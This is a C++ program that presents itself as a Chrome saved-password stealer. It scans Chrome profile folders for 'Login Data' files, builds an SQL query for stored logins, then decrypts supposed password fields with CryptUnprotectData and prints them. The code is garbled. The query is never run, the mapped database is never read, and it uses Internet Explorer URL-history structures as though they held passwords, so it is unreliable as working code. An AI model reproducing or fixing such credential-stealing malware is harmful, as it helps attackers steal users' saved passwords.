#include <iostream>
#include <vector>
#include <Windows.h>
#include <wincred.h>
#include <Cryptprotect.h>
#include <Urlhist.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "urlhist.lib")

std::vector<std::string> GetChromePasswords() {
    std::vector<std::string> passwords;

    // Get Chrome's profile directory path
    TCHAR profilePath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, profilePath))) {
        _tcscat_s(profilePath, MAX_PATH, _T("\\Google\\Chrome\\User Data\\"));
    }
    else {
        return passwords;
    }

    HANDLE hFind;
    WIN32_FIND_DATA findData;
    TCHAR userFile[MAX_PATH];
    _stprintf_s(userFile, MAX_PATH, _T("%s*"), profilePath);
    hFind = FindFirstFile(userFile, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return passwords;
    }

    do {
        TCHAR loginFile[MAX_PATH];
        _stprintf_s(loginFile, MAX_PATH, _T("%s%s\\Login Data"), profilePath, findData.cFileName);

        // Open Chrome's Login Data database
        HANDLE hFile = CreateFile(loginFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, NULL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            continue;
        }

        HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
        LPVOID lpMap = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        if (lpMap == NULL) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            continue;
        }

        // Query the Login Data database
        LPCTSTR symbol = _T("\\");
        for (int i = 0; i < _tcslen(findData.cFileName); i++) {
            if (_tcsnicmp(findData.cFileName + i, symbol, _tcslen(symbol)) == 0) {
                TCHAR profile[_MAX_PATH];
                _tcscpy_s(profile, _MAX_PATH, findData.cFileName + i + 1);
                if (_tcslen(profile) > 0) {
                    TCHAR query[MAX_PATH];
                    _stprintf_s(query, MAX_PATH, _T("SELECT origin_url, username_value, password_value FROM logins WHERE username_value IS NOT NULL AND password_value IS NOT NULL AND password_value != \'\' AND origin_url LIKE \'%%%s%%\'"), profile);

                    IUrlHistoryStg2* pUrlHistoryStg2;
                    HRESULT hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER, IID_IUrlHistoryStg2, (void**)&pUrlHistoryStg2);
                    if (SUCCEEDED(hr)) {
                        IEnumSTATURL* pEnumSTATURL;
                        hr = pUrlHistoryStg2->EnumUrls(&pEnumSTATURL);
                        if (SUCCEEDED(hr)) {
                            STATURL staturl;
                            ULONG fetched;
                            int count = 0;
                            while ((hr = pEnumSTATURL->Next(1, &staturl, &fetched)) == S_OK) {
                                if (_tcsstr(staturl.pwcsUrl, profile)) {
                                    // Decrypt the password using the Windows Crypto API
                                    DATA_BLOB inBlob = { (DWORD)staturl.cbPassword, (BYTE*)staturl.rgbPassword };
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &outBlob)) {
                                        std::string password((const char*)outBlob.pbData, outBlob.cbData);
                                        passwords.push_back(std::string(staturl.pwszUrl) + "\t" + std::string(staturl.pwcsUserName) + "\t" + password);
                                        LocalFree(outBlob.pbData);
                                    }
                                }
                                CoTaskMemFree(staturl.pwcsUrl);
                                CoTaskMemFree(staturl.pwcsUserName);
                                CoTaskMemFree(staturl.pwcsExtraInfo);
                                CoTaskMemFree(staturl.pwcsReferencedUrl);
                                CoTaskMemFree(staturl.pwcsRedirectUrl);
                                if (++count > 1000) { // Limit the number of results to avoid extremely long runtime
                                    break;
                                }
                            }
                            pEnumSTATURL->Release();
                        }
                        pUrlHistoryStg2->Release();
                    }
                }
                break;
            }
        }

        UnmapViewOfFile(lpMap);
        CloseHandle(hMapping);
        CloseHandle(hFile);
    } while (FindNextFile(hFind, &findData));

    FindClose(hFind);

    return passwords;
}

int main() {
    std::vector<std::string> passwords = GetChromePasswords();
    if (passwords.size() == 0) {
        std::cout << "No passwords found." << std::endl;
    }
    else {
        std::cout << "Found " << passwords.size() << " passwords." << std::endl;
        for (const auto& password : passwords) {
            std::cout << password << std::endl;
        }
    }
    return 0;
}
